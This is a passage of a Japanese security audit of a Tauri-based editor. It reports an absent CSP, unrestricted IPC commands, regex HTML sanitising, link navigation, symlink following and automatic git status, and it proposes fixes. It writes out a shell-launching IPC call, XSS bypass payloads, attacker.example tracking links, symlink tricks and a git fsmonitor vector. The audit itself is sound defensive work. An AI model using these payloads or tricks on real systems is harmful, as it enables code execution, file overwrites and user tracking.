## 所見

### 高

#### 1. CSP が無効で、IPC のコマンドがパスも実行ファイルも制限しない（XSS が 1 つ成立すれば即コード実行）

- 攻撃: webview に HTML を 1 か所注入できれば、`invoke("git", { bin: "/bin/sh", cwd: "/", args: ["-c", "…"] })` で任意のコマンドを実行でき、`write_text` でプラグインフォルダに `.js` を書けば次回起動以降も残る。
- 根拠:
  - `src-tauri/tauri.conf.json:16` `"security": { "csp": null }`。インラインスクリプトも外部スクリプトも制限されない。
  - `src-tauri/src/lib.rs:149-159`（`git`）と `:253-266`（`tool`）は `bin` を webview から受け取り、`src-tauri/src/process.rs:111-114` は設定されたパスが実行可能であれば名前を問わず実行する。`args` と `cwd` も webview の値そのもの。
  - `src-tauri/src/lib.rs:45-98`、`:108-125` の `read_text`、`read_bytes`、`write_text`、`write_bytes`（ヘッダの `path` を percent デコードしただけ）、`make_dir`、`rename_path`、`move_path`、`remove_path`、`copy_file`、`list_dir`、`list_tree` はどれも絶対パスをそのまま使い、ワークスペースや設定ディレクトリに閉じていない。`search_files`、`replace_files`（`:295-370`）の `roots` も同じ。
  - `src-tauri/capabilities/default.json:4` は `"windows": ["*"]` で、すべてのウィンドウに同じ権限を与える。
- 補足: 注入の経路そのものは、所見 2（Golem の HTML）と 4（Mermaid）が候補だが、成立は未確認。それでも、この構造は「webview を完全に信頼する」前提であり、1 件の XSS で被害が RCE と永続化に達する。
- 修正:
  - CSP を設定する（例: `default-src 'self'; script-src 'self' blob:; style-src 'self' 'unsafe-inline'; img-src 'self' blob: data:; frame-src blob:; connect-src ipc: http://ipc.localhost`。`blob:` はプラグインの `import` と SVG/PDF の表示に要る）。
  - `git`、`tool`、`lsp_start` の `bin` を IPC の引数から外し、Rust 側が設定ファイルを読んで決める。`tool` の `name` は既に golem/shem に限られているが、`args` の先頭（サブコマンド）も許可リストにする。
  - ファイル系コマンドは、Rust 側で `canonicalize` したうえで、設定ファイルに書かれたワークスペース、アプリの設定ディレクトリ、キャッシュディレクトリの下に限る。ワークスペースの一覧は Rust 側が `config.json` から読む。

### 中

#### 2. Golem の HTML を正規表現で消毒しており、迂回できる（`app/preview/xhtml.ts`）

- 攻撃: `build/html/<章>.xhtml` に危険なタグが混ざれば、`render.ts:56-58` が `innerHTML` に入れて実行される。
- 根拠: `app/preview/xhtml.ts:12-17`。node で通した結果、次が素通りする。
  - `<img src=x onerror=alert(1)>`（引用符のない属性）、`<svg/onload=alert(1)>`
  - `<a href='javascript:alert(1)'>`（単引用符）、`<a href="java&#9;script:alert(1)">`（実体参照）
  - `<iframe srcdoc="…">`、`<object data="…">`
- 注入経路: Golem（参照した版）は本文を `escapeXml` で逃がし（`modules/golem-html/src/Golem/Html.hs:663`）、リンクの URL も逃がす（同 `:711`）。`build/html` はビルドのたびに消してから書く（`modules/golem-driver/src/Golem/Driver.hs:1106-1111`、`cleanDir` は `:1218-1221`）ので、リポジトリに仕込んだ古い `.xhtml` も残らない。残る候補は、Golem のリンク URL のスキームに空白を混ぜる（`java<TAB>script:`）など Golem 側の解釈に依るもので、未確認。同梱の v0.1.0-rc3 が `build/html` を消すかも未確認。消さない版だと、manifest にない `.gm`（`app/preview/mount.ts:66-69` は開いている `.gm` すべてについて `build/html/…xhtml` を読む）に対応する `.xhtml` を仕込めば、ツリーに出ない `build/` から XSS に至る。
- 修正: 正規表現をやめ、`DOMParser` で読んで許可リスト（タグと属性）で組み立て直す。`href` は `http(s):`、`#`、相対のみ、`<img>` は `data-src` に書き換えるだけにし、`on*`、`style`、`srcdoc`、`<iframe>`、`<object>`、`<embed>`、`<form>`、`<base>`、`<meta>` を落とす。テストに上のペイロードを入れる。

#### 3. プレビュー内のリンクをクリックすると webview そのものが外部サイトへ遷移しうる

- 攻撃: 共有された `.md` に `[続き](https://attacker.example/)` や裸の URL を書く。クリックで Aleph のメインウィンドウが攻撃者のページに置き換わる（偽の「保存に失敗しました。再ログイン」画面など）。Golem の HTML のリンク（`Html.hs:711`）と Mermaid の `click A "https://…"`（strict でも `sanitizeUrl` を通した `http(s)` は許す。`node_modules/mermaid/dist/chunks/mermaid.core/chunk-6MUBBAK2.mjs:143-151`、`chunk-LEVMRMFU.mjs:51`）も同じ。
- 根拠: `app/md.ts:346` は `http(s):` と `file:` の `href` をそのまま出す（`:325` の `safeUrl` は `javascript:`、`vbscript:`、`data:` だけを止める）。クリックを横取りするのは `a.wikilink` だけ（`app/wikilinkmount.ts:245-251`）。Rust 側に `on_navigation` の制限はない（`src-tauri/src/lib.rs:518-593`）。
- 未確認: Tauri 2 がこの遷移を既定で止めるかどうか。遷移先は capability の `remote` に入っていないので IPC は使えないが、画面は乗っ取られる。
- 修正: `.pview` 内の `a[href]` のクリックを `preventDefault` し、外部 URL は何もしないか、確認のうえ `tauri-plugin-opener` で既定のブラウザに渡す。Rust 側でも `WebviewWindowBuilder::on_navigation` で `tauri://localhost` 以外を拒む。

#### 4. シンボリックリンクを辿るため、ツリーの読み込みが止まらず、ワークスペース外を読み書きしうる

- 攻撃 a（停止）: リポジトリに `a -> .` と `b -> .` を入れてクローンさせる。`fsops::tree` は `path.is_dir()`（リンク先を見る）で再帰し、ループの検出も深さの上限もないので、パス長の上限（約 1024 バイト）に達するまで 2^500 規模に膨らむ。`list_tree` はワークスペースを開くたびに走る。
- 攻撃 b（外部の露出）: `docs -> ../../..` のようなリンクで、ツリーにホームディレクトリが現れる。`app/wikilinkmount.ts:56` はツリー上のすべての `.md` を読み、埋め込み `![[名前]]` はファイル名で解決する（`app/wikilink.ts:130`）ので、ユーザの私的なメモをプレビューに出せる。持ち出しの経路は確認できなかった（`git add -A` はリンクを追加するだけ、検索は `ignore` がリンクを辿らない）。
- 攻撃 c（外部への書き込み）: `memo.md -> ~/.zshrc` のようなファイルのリンク。ユーザが編集すれば `app/main.ts:104-113` の `save` が `fsops::write_text`（`src-tauri/src/fsops.rs:44-49`、`std::fs::write` はリンクを辿る）でリンク先を上書きする。ユーザの編集が要る。
- 根拠: `src-tauri/src/fsops.rs:22-42`（`:28` の `is_dir`）、`:44-49`。
- 修正: `tree` で `symlink_metadata` を使い、リンクは葉として表示するか無視する。深さの上限を置く。`write_text`、`write_bytes`、`copy_file` の書き先がリンクなら拒む（`symlink_metadata().file_type().is_symlink()`）。

#### 5. 起動時にすべてのワークスペースで `git status` を自動実行する（`.git` ごと渡された場合に限りコード実行）

- 攻撃: zip や共有フォルダで `.git` ごと受け取ったワークスペースに、`.git/config` の `core.fsmonitor = <コマンド>` や `core.hooksPath` と hook を仕込む。Aleph は起動時と毎時に `git status` を走らせる（`app/gitpanel.ts:57-72`、`:223-224`、`:30-35`）。通常のクローンでは `.git/config` と hook は伝わらないので、この条件に限る。
- 根拠: `src-tauri/src/lib.rs:149-159`、`src-tauri/src/process.rs:17-28`（シェルは使わず、引数は配列。これ自体は適切）。
- 修正: 自動実行する git に `-c core.fsmonitor=false -c core.hooksPath=/dev/null --no-optional-locks` を付ける。初めて開くワークスペースでは自動コミットを尋ねる。

#### 6. Markdown と Mermaid のプレビューがリモートの画像を読み込み、ファイルを開いたことが外部に伝わる

- 攻撃: 共有された `.md` に `![](https://attacker.example/p.png?id=…)` を書く。プレビューした時点で IP アドレスと時刻が相手に届く。Mermaid の `image` 図形（`chunk-HFQBQIA3.mjs:67-71`）も同じ。

## 修正の優先順位

1. CSP を設定し、`git`／`tool`／`lsp_start` の `bin` を IPC から外し、ファイル系コマンドをワークスペースと設定ディレクトリの下に限る（所見 1）。これが他のすべての所見の被害を局所化する。
2. `chapterBody` を `DOMParser` と許可リストで書き直し、迂回ペイロードをテストに入れる（所見 2）。
3. プレビューのリンクの遷移を止め、Rust 側で `on_navigation` を制限する（所見 3）。
4. `fsops::tree` と書き込み系でシンボリックリンクを辿らない（所見 4）。
5. 自動実行する git に `-c core.fsmonitor=false -c core.hooksPath=/dev/null` を付ける（所見 5）。
6. Markdown の画像をローカルだけにし、CSP の `img-src` で補う（所見 6）。
7. `golem fmt` などの相対パスに `--` を置く（所見 7）。
8. `resolve`、ブックマーク、plot の `file` 列を root の下に限る（所見 8、9）。
9. CI に `npm audit` と `cargo audit` を足し、Mermaid の更新を追う（所見 10）。
